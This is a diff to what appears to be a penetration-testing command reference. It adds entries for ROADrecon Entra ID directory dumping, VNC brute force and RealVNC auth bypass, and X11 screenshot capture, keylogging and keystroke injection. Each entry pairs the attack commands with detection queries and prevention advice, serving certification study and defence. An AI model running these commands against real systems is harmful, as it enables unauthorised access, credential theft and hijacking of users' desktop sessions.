+      "id": "cloud-roadrecon",
+      "name": "ROADrecon - Offline Azure AD / Entra ID Enumeration",
+      "command": "roadrecon gather",
+      "description": "ROADrecon (part of ROADtools) authenticates to Entra ID and dumps the entire directory into a local SQLite database, then serves an offline GUI and BI/analysis of users, groups, roles, applications, service principals, devices, and OAuth2 permission grants. Enables deep offline Azure AD recon and privilege-path analysis after a single collection.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Cloud Security",
+      "subcategory": "Azure Enumeration",
+      "certifications": [
+        "MCRTA",
+        "CRTP"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "dirkjanm/ROADtools",
+      "tags": [
+        "roadrecon",
+        "roadtools",
+        "azure",
+        "entra",
+        "azure-ad",
+        "enumeration",
+        "offline"
+      ],
+      "mitre": [
+        "T1087.004"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== AUTHENTICATE ===\n  roadrecon auth -u <user> -p <password>\n  # Device code flow:\n  roadrecon auth --device-code\n  # With a refresh token:\n  roadrecon auth --refresh-token \"<refresh_token>\"\n  # As a service principal:\n  roadrecon auth -c <app_id> --as-app -p \"<client_secret>\" -t <domain>\n\n=== GATHER THE DIRECTORY (-> roadrecon.db SQLite) ===\n  roadrecon gather\n  roadrecon gather --mfa        # include MFA/auth method data\n\n=== OFFLINE GUI ===\n  roadrecon gui\n  # Browse users/groups/roles/apps/SPs/devices/OAuth grants at http://127.0.0.1:5000\n\n=== PLUGINS / ANALYSIS ===\n  roadrecon plugin policies      # dump Conditional Access policies\n  roadrecon plugin road2timeline  # activity timeline\n\n=== WHAT TO LOOK FOR ===\n  - Users/SPs with directory/privileged roles\n  - App registrations with secrets + high permissions\n  - OAuth2PermissionGrants (illicit consent)\n  - Dynamic group rules (self-add escalation)\n\n=== ALTERNATIVES ===\n  AzureHound     # BloodHound graph format\n  Stormspotter   # ARM + AAD\n  az cli / Graph # targeted queries",
+      "examples": [
+        {
+          "label": "Auth + gather directory",
+          "command": "roadrecon auth -u user@corp.com -p \"Passw0rd!\" && roadrecon gather"
+        },
+        {
+          "label": "Device-code auth",
+          "command": "roadrecon auth --device-code"
+        },
+        {
+          "label": "Launch offline GUI",
+          "command": "roadrecon gui"
+        }
+      ],
+      "references": [
+        {
+          "title": "ROADtools",
+          "url": "https://github.com/dirkjanm/ROADtools"
+        },
+        {
+          "title": "MITRE T1087.004",
+          "url": "https://attack.mitre.org/techniques/T1087/004/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "cloud-azurehound",
+          "note": "AzureHound produces BloodHound-graph output instead of SQLite.",
+          "rel": "alternative"
+        },
+        {
+          "id": "azure-entra-enum",
+          "note": "Targeted Entra enumeration for specific objects.",
+          "rel": "alternative"
+        },
+        {
+          "id": "azure-app-credential-abuse",
+          "note": "Abuse app/SP secrets ROADrecon surfaces.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "ROADrecon calls the internal Azure AD Graph/Microsoft Graph with a normal user or SP token. Default directory read permissions let any principal enumerate most of the tenant into an offline copy.",
+        "prerequisites": "Any valid Entra credential or token; network to login.microsoftonline.com and Graph.",
+        "impact": "Full offline copy of the tenant directory enabling privilege-path and misconfiguration analysis.",
+        "detection": "[MITRE T1087.004] Bulk Graph/AAD Graph reads from one principal; ROADrecon/ROADtools client identifiers; device-code auth from unusual locations.",
+        "artifacts": "Entra sign-in logs with ROADtools client; high-volume directory reads; a roadrecon.db on the attacker host.",
+        "splunk_spl": "index=azure sourcetype=azure:signin OR sourcetype=azure:graph\n| stats count by user, appDisplayName\n| where count > 500",
+        "elastic_kql": "azure.signinlogs.properties.app_display_name:*ROADtools* or azure.graphactivitylogs.properties.user_agent:*road*",
+        "sentinel_kql": "SigninLogs\n| where AppDisplayName has \"ROADtools\" or UserAgent has \"roadrecon\"\n| project TimeGenerated, UserPrincipalName, IPAddress, AppDisplayName",
+        "sigma_rules": "azure_roadrecon_enumeration",
+        "prevention": "Least-privilege roles; restrict directory read and guest access; Conditional Access to block legacy/unknown clients and risky sign-ins; monitor bulk Graph reads; disable device-code flow where unused.",
+        "sources": [
+          "dirkjanm/ROADtools",
+          "https://attack.mitre.org/techniques/T1087/004/"
+        ]
+      }
+    },
+    {
       "id": "ad-rpcclient-null",
       "name": "rpcclient - Null Session RPC Enumeration",
       "command": "rpcclient -U \"\" -N <dc_ip>",
@@ -172269,6 +172884,89 @@ const COMMAND_DATA = {
       "explain": "Brute-forces the HTTP Host header to find virtual hosts served from one IP:\n  gobuster vhost   virtual-host discovery mode\n  -u http://<ip>   the target IP/base URL\n  -w <wordlist>    host names to try in the Host header\n  --append-domain  append the base domain to each word (word.domain)\nDifferent Host values can serve entirely different sites; add -k for HTTPS with invalid certs and -o to save hits."
     },
     {
+      "id": "recon-vnc",
+      "name": "VNC Enumeration & Authentication Attacks",
+      "command": "nmap -p5900 --script vnc-info,vnc-title,realvnc-auth-bypass <target>",
+      "description": "VNC remote desktop services (5900-5906, 5800 for web) are often exposed with no auth, weak passwords, or known auth-bypass CVEs. Enumerate version and auth type, test for no-auth access, brute the 8-char password, or exploit RealVNC auth bypass (CVE-2006-2369). A foothold or lateral-movement vector giving full GUI control.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Information Gathering",
+      "subcategory": "Service Enumeration",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "PEN-200 service enumeration; nmap NSE",
+      "tags": [
+        "vnc",
+        "rfb",
+        "5900",
+        "remote-desktop",
+        "brute-force",
+        "auth-bypass"
+      ],
+      "mitre": [
+        "T1021.005",
+        "T1110.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== ENUMERATE ===\n  nmap -p5900-5906,5800 -sV <target>\n  nmap -p5900 --script vnc-info,vnc-title,realvnc-auth-bypass <target>\n  # vnc-info reports protocol version + security types (2=VNC auth, 1=None)\n\n=== CONNECT (test no-auth / known pass) ===\n  vncviewer <target>:5900\n  vncviewer <target>::5900 -passwd pass.file\n\n=== BRUTE FORCE (VNC password max 8 chars) ===\n  hydra -P /usr/share/wordlists/rockyou.txt -t 4 <target> vnc\n  # Metasploit:\n  msf> use auxiliary/scanner/vnc/vnc_login\n  msf> use auxiliary/scanner/vnc/vnc_none_auth\n\n=== CRACK A CAPTURED VNC PASSWORD FILE ===\n  # VNC stores passwords DES-encrypted with a fixed key:\n  vncpwd passwd            # or metasploit vnc decrypt\n  # ~/.vnc/passwd on Linux, registry on Windows (HKLM\\...\\WinVNC)\n\n=== REALVNC AUTH BYPASS (CVE-2006-2369) ===\n  msf> use auxiliary/admin/vnc/realvnc_41_bypass\n  # Server accepts \"None\" security type even when auth is required\n\n=== ALTERNATIVES / NEXT ===\n  # Once in: it is a full GUI session as the logged-on user\n  # Look for saved creds, RDP onward, screen content",
+      "examples": [
+        {
+          "label": "Enumerate VNC + check bypass",
+          "command": "nmap -p5900 --script vnc-info,realvnc-auth-bypass 10.10.10.10"
+        },
+        {
+          "label": "Brute force VNC password",
+          "command": "hydra -P /usr/share/wordlists/rockyou.txt -t 4 10.10.10.10 vnc"
+        },
+        {
+          "label": "Connect with viewer",
+          "command": "vncviewer 10.10.10.10:5900"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks - VNC pentesting",
+          "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc"
+        },
+        {
+          "title": "MITRE T1021.005 - VNC",
+          "url": "https://attack.mitre.org/techniques/T1021/005/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "gs-nmap-service-scan",
+          "note": "Identify the VNC service/port first.",
+          "rel": "prereq"
+        },
+        {
+          "id": "recon-x11",
+          "note": "X11 is the other classic exposed-display vector.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "VNC (RFB) often ships with no/weak auth, an 8-char password limit, and reusable DES-encrypted password stores. Exposed services and legacy versions allow bypass or brute force to a full interactive desktop.",
+        "prerequisites": "Network access to the VNC port; exposed/weakly-authed service.",
+        "impact": "Full GUI control of the host as the logged-on user; credential theft; lateral movement.",
+        "detection": "[MITRE T1021.005/T1110.001] Many RFB handshake attempts (repeated 5900 connections) from one source; successful VNC auth from unusual IPs; nmap VNC NSE signatures.",
+        "artifacts": "Firewall/IDS logs of repeated 5900 connections; VNC server auth logs; new RFB sessions.",
+        "splunk_spl": "index=network dest_port>=5900 dest_port<=5906\n| stats count by src_ip, dest_ip\n| where count > 20",
+        "elastic_kql": "destination.port:(5900 or 5901 or 5902) and network.transport:tcp",
+        "sentinel_kql": "DeviceNetworkEvents\n| where RemotePort between (5900 .. 5906)\n| summarize Attempts=count() by RemoteIP, DeviceName, bin(Timestamp, 10m)\n| where Attempts > 20",
+        "sigma_rules": "net_vnc_bruteforce_or_exposure",
+        "prevention": "Never expose VNC to untrusted networks (tunnel over SSH/VPN); require strong auth; patch RealVNC; use unique long passwords; restrict by source IP; prefer modern RDP with NLA.",
+        "sources": [
+          "HackTricks",
+          "https://attack.mitre.org/techniques/T1021/005/"
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "linux",
       "requires": [
@@ -186412,6 +187110,90 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "recon-x11",
+      "name": "X11 Open Display Abuse - Keylog & Screenshot",
+      "command": "xdotool key --window <id> ; xwd -root -display <target>:0",
+      "description": "An exposed X11 server (TCP 6000-6009) with weak access control (xhost +) lets a remote attacker connect to the display, capture screenshots, log keystrokes, and inject input. Classic Linux exposure giving credential capture and session hijack without exploiting any binary. Enumerate with nmap, then grab the screen or keylog the active session.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Information Gathering",
+      "subcategory": "Service Enumeration",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "PEN-200 service enumeration; nmap NSE",
+      "tags": [
+        "x11",
+        "xorg",
+        "6000",
+        "screenshot",
+        "keylogger",
+        "display",
+        "xhost"
+      ],
+      "mitre": [
+        "T1056.001",
+        "T1113"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== ENUMERATE ===\n  nmap -p6000-6009 -sV <target>\n  nmap -p6000 --script x11-access <target>\n  # x11-access reports whether the display allows unauthenticated clients\n\n=== TEST ACCESS ===\n  xdpyinfo -display <target>:0\n  # If it works, access control is open (xhost + or no magic cookie)\n\n=== SCREENSHOT THE REMOTE DISPLAY ===\n  xwd -root -display <target>:0 -out screenshot.xwd\n  convert screenshot.xwd screenshot.png     # imagemagick\n  # or:\n  import -display <target>:0 -window root screenshot.png\n\n=== KEYLOG THE ACTIVE SESSION ===\n  xspy <target>:0\n  # or xinput: find keyboard id then test\n  xinput --list --short\n  xinput --test <keyboard_id>\n\n=== INJECT KEYSTROKES ===\n  xdotool --display <target>:0 key ctrl+alt+t\n  xdotool --display <target>:0 type \"id > /tmp/pwned\"\n\n=== IF ACCESS IS RESTRICTED (magic cookie) ===\n  # Need ~/.Xauthority cookie; harvest it from the host if you have a shell\n  export XAUTHORITY=/home/<user>/.Xauthority\n\n=== ALTERNATIVES ===\n  recon-vnc        # the other exposed-display vector\n  # Steal .Xauthority + DISPLAY after a foothold for local capture",
+      "examples": [
+        {
+          "label": "Check for open X11",
+          "command": "nmap -p6000 --script x11-access 10.10.10.10"
+        },
+        {
+          "label": "Screenshot remote display",
+          "command": "xwd -root -display 10.10.10.10:0 -out shot.xwd && convert shot.xwd shot.png"
+        },
+        {
+          "label": "Keylog the session",
+          "command": "xspy 10.10.10.10:0"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks - Pentesting X11",
+          "url": "https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11"
+        },
+        {
+          "title": "MITRE T1056.001 - Keylogging",
+          "url": "https://attack.mitre.org/techniques/T1056/001/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "recon-vnc",
+          "note": "VNC is the other classic remote-display exposure.",
+          "rel": "alternative"
+        },
+        {
+          "id": "gs-nmap-service-scan",
+          "note": "Identify the X11 ports first.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "X11 with host-based access control disabled (xhost +) or a leaked .Xauthority cookie lets any client connect to the display and read/inject input, because the X protocol trusts connected clients fully.",
+        "prerequisites": "Network access to TCP 6000-6009; display with open access control or a stolen Xauthority cookie.",
+        "impact": "Screenshot capture, keystroke logging (credential theft), and input injection on the victim desktop.",
+        "detection": "[MITRE T1056.001/T1113] Remote TCP connections to 6000-6009; xwd/import/xspy usage; X server accepting unauthenticated remote clients.",
+        "artifacts": "Network connections to X11 ports from non-local hosts; X server logs of foreign clients.",
+        "splunk_spl": "index=network dest_port>=6000 dest_port<=6009 NOT src_ip=127.0.0.1\n| stats count by src_ip, dest_ip",
+        "elastic_kql": "destination.port:(6000 or 6001 or 6002) and not source.ip:\"127.0.0.1\"",
+        "sentinel_kql": "DeviceNetworkEvents\n| where RemotePort between (6000 .. 6009) and RemoteIP !startswith \"127.\"\n| project Timestamp, DeviceName, RemoteIP, RemotePort",
+        "sigma_rules": "net_x11_remote_access",
+        "prevention": "Disable X11 TCP listening (-nolisten tcp, default on modern distros); never run xhost +; use SSH X11 forwarding; firewall 6000-6009; protect .Xauthority; prefer Wayland.",
+        "sources": [
+          "HackTricks",
+          "https://attack.mitre.org/techniques/T1056/001/"
+        ]
+      }
+    },
+    {
       "id": "pth-freerdp",
       "name": "xFreeRDP - Pass the Hash",
       "command": "xfreerdp /v:<ip> /u:<user> /pth:<nt_hash>",
@@ -191283,8 +192065,8 @@ const COMMAND_DATA = {
       }
     }
   ],
-  "totalCommands": 1074,
-  "buildDate": "2026-11-11T05:18:51.923Z",
+  "totalCommands": 1082,
+  "buildDate": "2026-11-11T05:30:43.306Z",
   "certifications": [
     "CDSA",
     "CPTS",
